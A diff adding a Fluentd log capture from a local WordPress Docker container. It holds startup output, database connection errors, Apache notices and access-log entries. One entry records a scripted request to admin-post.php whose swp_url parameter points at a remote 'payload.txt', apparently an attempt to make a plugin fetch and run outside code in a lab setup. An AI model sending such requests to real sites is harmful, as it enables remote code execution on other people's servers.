@@ -1,0 +1,39 @@
+fluentd -c /fluentd/etc/fluentd.conf
+2023-07-31 23:27:28 +0000 [info]: init supervisor logger path=nil rotate_age=nil rotate_size=nil
+2023-07-31 23:27:28 +0000 [info]: parsing config file is succeeded path="/fluentd/etc/fluentd.conf"
+2023-07-31 23:27:28 +0000 [info]: gem 'fluentd' version '1.16.2'
+2023-07-31 23:27:28 +0000 [info]: using configuration file: <ROOT>
+  <source>
+    @type forward
+    port 24224
+    bind "0.0.0.0"
+  </source>
+  <match cdab6c786756.**>
+    @type stdout
+  </match>
+</ROOT>
+2023-07-31 23:27:28 +0000 [info]: starting fluentd-1.16.2 pid=7 ruby="3.1.4"
+2023-07-31 23:27:28 +0000 [info]: spawn command to main:  cmdline=["/usr/local/bin/ruby", "-Eascii-8bit:ascii-8bit", "/usr/local/bundle/bin/fluentd", "-c", "/fluentd/etc/fluentd.conf", "--plugin", "/fluentd/plugins", "--under-supervisor"]
+2023-07-31 23:27:29 +0000 [info]: #0 init worker0 logger path=nil rotate_age=nil rotate_size=nil
+2023-07-31 23:27:29 +0000 [info]: adding match pattern="cdab6c786756.**" type="stdout"
+2023-07-31 23:27:29 +0000 [info]: adding source type="forward"
+2023-07-31 23:27:29 +0000 [info]: #0 starting fluentd worker pid=16 ppid=7 worker=0
+2023-07-31 23:27:29 +0000 [info]: #0 listening port port=24224 bind="0.0.0.0"
+2023-07-31 23:27:29 +0000 [info]: #0 fluentd worker is now running worker=0
+2023-07-31 23:27:41.000000000 +0000 cdab6c786756: {"container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stdout","log":""}
+2023-07-31 23:27:41.000000000 +0000 cdab6c786756: {"log":"Warning: mysqli::__construct(): (HY000/2002): Connection refused in Standard input code on line 22","container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stdout"}
+2023-07-31 23:27:41.000000000 +0000 cdab6c786756: {"container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stderr","log":""}
+2023-07-31 23:27:41.000000000 +0000 cdab6c786756: {"log":"MySQL Connection Error: (2002) Connection refused","container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stderr"}
+2023-07-31 23:27:44.000000000 +0000 cdab6c786756: {"container_name":"/wordpress","source":"stderr","log":"AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.3. Set the 'ServerName' directive globally to suppress this message","container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968"}
+2023-07-31 23:27:44.000000000 +0000 cdab6c786756: {"log":"AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.3. Set the 'ServerName' directive globally to suppress this message","container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stderr"}
+2023-07-31 23:27:44.000000000 +0000 cdab6c786756: {"container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stderr","log":"[Mon Jul 31 23:27:44.771125 2023] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.25 (Debian) PHP/7.2.1 configured -- resuming normal operations"}
+2023-07-31 23:27:44.000000000 +0000 cdab6c786756: {"container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stderr","log":"[Mon Jul 31 23:27:44.772064 2023] [core:notice] [pid 1] AH00094: Command line: 'apache2 -D FOREGROUND'"}
+2023-07-31 23:27:56.000000000 +0000 cdab6c786756: {"container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stdout","log":"172.18.0.1 - - [31/Jul/2023:23:27:54 +0000] \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 509 \"http://localhost:9000/wp-admin/edit.php\" \"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0\""}
+2023-07-31 23:28:09.000000000 +0000 cdab6c786756: {"source":"stdout","log":"172.18.0.1 - - [31/Jul/2023:23:28:09 +0000] \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 509 \"http://localhost:9000/wp-admin/edit.php\" \"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0\"","container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress"}
+2023-07-31 23:28:10.000000000 +0000 cdab6c786756: {"container_id":"cdab6c7867568b0efdd5528c0ca8ebb8898195b0d50fdd989ab1038487615968","container_name":"/wordpress","source":"stdout","log":"172.18.0.1 - - [31/Jul/2023:23:28:08 +0000] \"GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://raw.githubusercontent.com/Carmofrasao/teste/main/payload.txt HTTP/1.1\" 200 2228 \"-\" \"python-requests/2.31.0\""}
+2023-07-31 23:28:53 +0000 [info]: Received graceful stop
+2023-07-31 23:28:54 +0000 [info]: #0 fluentd worker is now stopping worker=0
+2023-07-31 23:28:54 +0000 [info]: #0 shutting down fluentd worker worker=0
+2023-07-31 23:28:54 +0000 [info]: #0 shutting down input plugin type=:forward plugin_id="object:884"
+2023-07-31 23:28:54 +0000 [info]: #0 shutting down output plugin type=:stdout plugin_id="object:85c"
+2023-07-31 23:28:54 +0000 [info]: Worker 0 finished with status 0
